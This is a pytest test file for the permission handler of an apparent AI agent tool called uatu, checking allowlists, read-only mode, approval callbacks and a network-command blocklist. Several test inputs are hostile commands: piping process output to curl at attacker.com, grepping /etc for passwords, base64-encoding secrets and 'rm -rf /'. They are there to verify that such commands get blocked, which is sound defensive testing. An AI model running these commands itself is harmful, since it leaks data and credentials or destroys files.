"""Tests for permission handler."""

import os
import tempfile
from pathlib import Path
from unittest.mock import AsyncMock

import pytest

from uatu.allowlist import AllowlistManager
from uatu.permissions import PermissionHandler

os.environ["ANTHROPIC_API_KEY"] = "test-key"


@pytest.fixture
def temp_config_dir():
    """Create a temporary config directory."""
    with tempfile.TemporaryDirectory() as tmpdir:
        yield Path(tmpdir)


@pytest.fixture
def handler(temp_config_dir, monkeypatch):
    """Create a PermissionHandler with temp allowlist.

    Sets UATU_READ_ONLY=false and UATU_REQUIRE_APPROVAL=false to allow bash commands in tests.
    """
    # Disable read-only mode and require-approval for tests that need to test bash permission logic
    monkeypatch.setenv("UATU_READ_ONLY", "false")
    monkeypatch.setenv("UATU_REQUIRE_APPROVAL", "false")

    allowlist = AllowlistManager(config_dir=temp_config_dir)
    return PermissionHandler(allowlist=allowlist)


class TestPermissionHandler:
    """Tests for PermissionHandler class."""

    @pytest.mark.asyncio
    async def test_non_bash_tool_allowed(self, handler):
        """Non-bash tools should be auto-allowed."""
        input_data = {"tool_name": "Read", "tool_input": {"file_path": "/etc/hosts"}}

        result = await handler.pre_tool_use_hook(input_data, None, None)

        assert result == {}  # Empty dict means allow

    @pytest.mark.asyncio
    async def test_allowlisted_command_auto_allowed(self, handler):
        """Allowlisted commands should be auto-allowed."""
        # Add command to allowlist
        handler.allowlist.add_command("top -bn1")

        input_data = {
            "tool_name": "Bash",
            "tool_input": {"command": "top -bn1", "description": "Check top"},
        }

        result = await handler.pre_tool_use_hook(input_data, None, None)

        assert result["hookSpecificOutput"]["permissionDecision"] == "allow"
        assert "allowlisted" in result["hookSpecificOutput"]["message"]

    @pytest.mark.asyncio
    async def test_no_callback_denies_by_default(self, handler):
        """Without approval callback, commands should be denied."""
        input_data = {
            "tool_name": "Bash",
            "tool_input": {"command": "rm -rf /tmp/test", "description": "Remove test dir"},
        }

        result = await handler.pre_tool_use_hook(input_data, None, None)

        assert result["hookSpecificOutput"]["permissionDecision"] == "deny"
        assert "No approval callback" in result["hookSpecificOutput"]["permissionDecisionReason"]

    @pytest.mark.asyncio
    async def test_user_approval_granted(self, handler):
        """User approval should allow command."""
        # Mock approval callback
        handler.get_approval_callback = AsyncMock(return_value=(True, False))

        input_data = {
            "tool_name": "Bash",
            "tool_input": {"command": "ls -la", "description": "List files"},
        }

        result = await handler.pre_tool_use_hook(input_data, None, None)

        assert result["hookSpecificOutput"]["permissionDecision"] == "allow"
        handler.get_approval_callback.assert_called_once_with("List files", "ls -la")

    @pytest.mark.asyncio
    async def test_user_approval_denied(self, handler):
        """User denial should deny command."""
        # Mock approval callback - user denies
        handler.get_approval_callback = AsyncMock(return_value=(False, False))

        input_data = {
            "tool_name": "Bash",
            "tool_input": {"command": "rm -rf /", "description": "Dangerous command"},
        }

        result = await handler.pre_tool_use_hook(input_data, None, None)

        assert result["hookSpecificOutput"]["permissionDecision"] == "deny"
        assert "User declined" in result["hookSpecificOutput"]["permissionDecisionReason"]


    @pytest.mark.asyncio
    async def test_add_to_allowlist_dangerous_command(self, handler):
        """Dangerous commands should be added as exact match."""
        # Mock approval - user wants to add to allowlist
        handler.get_approval_callback = AsyncMock(return_value=(True, True))

        input_data = {
            "tool_name": "Bash",
            "tool_input": {"command": "rm -rf /tmp/test", "description": "Remove dir"},
        }

        result = await handler.pre_tool_use_hook(input_data, None, None)

        assert result["hookSpecificOutput"]["permissionDecision"] == "allow"
        assert "exact match" in result["hookSpecificOutput"]["message"]

        # Verify it was added to allowlist
        entries = handler.allowlist.get_entries()
        assert len(entries) == 1
        assert entries[0]["pattern"] == "rm -rf /tmp/test"
        assert entries[0]["type"] == "exact"

    @pytest.mark.asyncio
    async def test_mcp_bash_tool_handled(self, handler):
        """MCP Bash tools should be handled (case insensitive)."""
        handler.get_approval_callback = AsyncMock(return_value=(True, False))

        input_data = {
            "tool_name": "mcp__system-tools__bash",
            "tool_input": {"command": "echo hello", "description": "Echo"},
        }

        result = await handler.pre_tool_use_hook(input_data, None, None)

        assert result["hookSpecificOutput"]["permissionDecision"] == "allow"
        handler.get_approval_callback.assert_called_once()

    @pytest.mark.asyncio
    async def test_empty_command_handling(self, handler):
        """Empty commands should be handled gracefully."""
        handler.get_approval_callback = AsyncMock(return_value=(False, False))

        input_data = {"tool_name": "Bash", "tool_input": {"command": "", "description": ""}}

        result = await handler.pre_tool_use_hook(input_data, None, None)

        # Should call approval callback for empty command
        assert result["hookSpecificOutput"]["permissionDecision"] == "deny"


class TestPermissionHandlerWithoutAllowlist:
    """Tests for PermissionHandler without injecting allowlist."""

    @pytest.mark.asyncio
    async def test_creates_default_allowlist(self):
        """Handler should create default allowlist if none provided."""
        handler = PermissionHandler()

        assert handler.allowlist is not None
        assert isinstance(handler.allowlist, AllowlistManager)

    @pytest.mark.asyncio
    async def test_allowlist_persists_across_handlers(self, temp_config_dir):
        """Allowlists should persist when using same config dir."""
        # Create first handler and add command
        handler1 = PermissionHandler(allowlist=AllowlistManager(config_dir=temp_config_dir))
        handler1.allowlist.add_command("top")

        # Create second handler with same config dir
        handler2 = PermissionHandler(allowlist=AllowlistManager(config_dir=temp_config_dir))

        # Should see the same allowlist
        assert handler2.allowlist.is_allowed("top")


class TestReadOnlyMode:
    """Tests for UATU_READ_ONLY enforcement."""

    @pytest.mark.asyncio
    async def test_read_only_blocks_all_bash(self, temp_config_dir, monkeypatch):
        """When UATU_READ_ONLY=true, all bash commands should be denied."""
        # Enable read-only mode
        monkeypatch.setenv("UATU_READ_ONLY", "true")

        handler = PermissionHandler(allowlist=AllowlistManager(config_dir=temp_config_dir))
        handler.get_approval_callback = AsyncMock(return_value=(True, False))

        input_data = {
            "tool_name": "Bash",
            "tool_input": {"command": "ls -la", "description": "List files"},
        }

        result = await handler.pre_tool_use_hook(input_data, None, None)

        assert result["hookSpecificOutput"]["permissionDecision"] == "deny"
        assert "UATU_READ_ONLY" in result["hookSpecificOutput"]["permissionDecisionReason"]
        # Callback should NOT be called when read-only mode is active
        handler.get_approval_callback.assert_not_called()

    @pytest.mark.asyncio
    async def test_read_only_blocks_allowlisted_commands(self, temp_config_dir, monkeypatch):
        """Even allowlisted commands should be blocked in read-only mode."""
        monkeypatch.setenv("UATU_READ_ONLY", "true")

        handler = PermissionHandler(allowlist=AllowlistManager(config_dir=temp_config_dir))
        handler.allowlist.add_command("ps aux")

        input_data = {
            "tool_name": "Bash",
            "tool_input": {"command": "ps aux", "description": "List processes"},
        }

        result = await handler.pre_tool_use_hook(input_data, None, None)

        assert result["hookSpecificOutput"]["permissionDecision"] == "deny"
        assert "UATU_READ_ONLY" in result["hookSpecificOutput"]["permissionDecisionReason"]

    @pytest.mark.asyncio
    async def test_read_only_allows_mcp_tools(self, temp_config_dir, monkeypatch):
        """MCP tools should still work in read-only mode (they're not bash)."""
        monkeypatch.setenv("UATU_READ_ONLY", "true")

        handler = PermissionHandler(allowlist=AllowlistManager(config_dir=temp_config_dir))

        input_data = {
            "tool_name": "mcp__system-tools__get_system_info",
            "tool_input": {},
        }

        result = await handler.pre_tool_use_hook(input_data, None, None)

        assert result == {}  # Empty dict means allow


class TestNetworkCommandBlocklist:
    """Tests for network command blocklist feature."""

    @pytest.mark.asyncio
    async def test_curl_blocked_by_default(self, handler):
        """curl should be blocked by default."""
        input_data = {"tool_name": "Bash", "tool_input": {"command": "curl https://example.com"}}

        result = await handler.pre_tool_use_hook(input_data, None, None)

        assert result["hookSpecificOutput"]["permissionDecision"] == "deny"
        assert "curl" in result["hookSpecificOutput"]["permissionDecisionReason"]
        assert "blocked" in result["hookSpecificOutput"]["permissionDecisionReason"].lower()

    @pytest.mark.asyncio
    async def test_wget_blocked(self, handler):
        """wget should be blocked."""
        input_data = {"tool_name": "Bash", "tool_input": {"command": "wget https://example.com/file"}}

        result = await handler.pre_tool_use_hook(input_data, None, None)

        assert result["hookSpecificOutput"]["permissionDecision"] == "deny"
        assert "wget" in result["hookSpecificOutput"]["permissionDecisionReason"]

    @pytest.mark.asyncio
    async def test_nc_blocked(self, handler):
        """nc (netcat) should be blocked."""
        input_data = {"tool_name": "Bash", "tool_input": {"command": "nc -l 1234"}}

        result = await handler.pre_tool_use_hook(input_data, None, None)

        assert result["hookSpecificOutput"]["permissionDecision"] == "deny"
        assert "nc" in result["hookSpecificOutput"]["permissionDecisionReason"]

    @pytest.mark.asyncio
    async def test_network_command_allowed_with_override(self, handler, monkeypatch):
        """Network commands should be allowed when UATU_ALLOW_NETWORK=true."""
        monkeypatch.setenv("UATU_ALLOW_NETWORK", "true")
        monkeypatch.setenv("UATU_REQUIRE_APPROVAL", "false")  # Skip approval for this test

        # Mock approval callback
        handler.get_approval_callback = AsyncMock(return_value=(True, True))

        input_data = {"tool_name": "Bash", "tool_input": {"command": "curl https://example.com"}}

        result = await handler.pre_tool_use_hook(input_data, None, None)

        # Should not be denied (will go to user approval)
        if "permissionDecision" in result.get("hookSpecificOutput", {}):
            assert (
                result["hookSpecificOutput"]["permissionDecision"] != "deny"
                or "blocked" not in result["hookSpecificOutput"]["permissionDecisionReason"].lower()
            )


class TestSuspiciousPatternDetection:
    """Tests for suspicious pattern detection."""

    @pytest.mark.asyncio
    async def test_pipe_to_curl_flagged(self, handler):
        """Piping to curl should force user approval even if ps is allowlisted."""
        # Add ps to allowlist
        handler.allowlist.add_command("ps")
        monkeypatch = pytest.MonkeyPatch()
        monkeypatch.setenv("UATU_REQUIRE_APPROVAL", "false")  # Normally would use allowlist

        # Mock approval callback
        handler.get_approval_callback = AsyncMock(return_value=(False, False))

        input_data = {
            "tool_name": "Bash",
            "tool_input": {"command": "ps aux | curl https://attacker.com -d @-"},
        }

        result = await handler.pre_tool_use_hook(input_data, None, None)

        # Should require user approval (not auto-allowed by allowlist)
        # Since we mocked approval to deny, it should be denied
        assert result["hookSpecificOutput"]["permissionDecision"] == "deny"

    @pytest.mark.asyncio
    async def test_grep_password_flagged(self, handler):
        """Searching for passwords should force user approval."""
        handler.allowlist.add_command("grep")

        # Mock approval callback to deny
        handler.get_approval_callback = AsyncMock(return_value=(False, False))

        input_data = {
            "tool_name": "Bash",
            "tool_input": {"command": "grep -r password /etc"},
        }

        result = await handler.pre_tool_use_hook(input_data, None, None)

        # Should require approval
        assert result["hookSpecificOutput"]["permissionDecision"] == "deny"

    @pytest.mark.asyncio
    async def test_base64_flagged(self, handler):
        """base64 encoding should force user approval."""
        handler.get_approval_callback = AsyncMock(return_value=(False, False))

        input_data = {
            "tool_name": "Bash",
            "tool_input": {"command": "echo secret | base64"},
        }

        result = await handler.pre_tool_use_hook(input_data, None, None)

        assert result["hookSpecificOutput"]["permissionDecision"] == "deny"


class TestRequireApprovalSetting:
    """Tests for UATU_REQUIRE_APPROVAL setting."""

    @pytest.mark.asyncio
    async def test_allowlist_respected_regardless_of_mode(self, handler, monkeypatch):
        """Allowlist is now checked in both interactive and stdin modes."""
        monkeypatch.setenv("UATU_REQUIRE_APPROVAL", "true")

        # Add command to allowlist
        handler.allowlist.add_command("ps")

        # Mock approval callback (shouldn't be called since ps is allowlisted)
        handler.get_approval_callback = AsyncMock(return_value=(False, False))

        input_data = {"tool_name": "Bash", "tool_input": {"command": "ps aux"}}

        result = await handler.pre_tool_use_hook(input_data, None, None)

        # Should auto-allow because it's allowlisted (behavior changed)
        assert result["hookSpecificOutput"]["permissionDecision"] == "allow"
        # Approval callback should NOT have been called
        handler.get_approval_callback.assert_not_called()

    @pytest.mark.asyncio
    async def test_require_approval_false_uses_allowlist(self, handler, monkeypatch):
        """When UATU_REQUIRE_APPROVAL=false, allowlist should work normally."""
        monkeypatch.setenv("UATU_REQUIRE_APPROVAL", "false")

        # Add command to allowlist
        handler.allowlist.add_command("ps")

        input_data = {"tool_name": "Bash", "tool_input": {"command": "ps aux"}}

        result = await handler.pre_tool_use_hook(input_data, None, None)

        # Should be auto-allowed
        assert result["hookSpecificOutput"]["permissionDecision"] == "allow"
        assert "allowlisted" in result["hookSpecificOutput"]["message"]
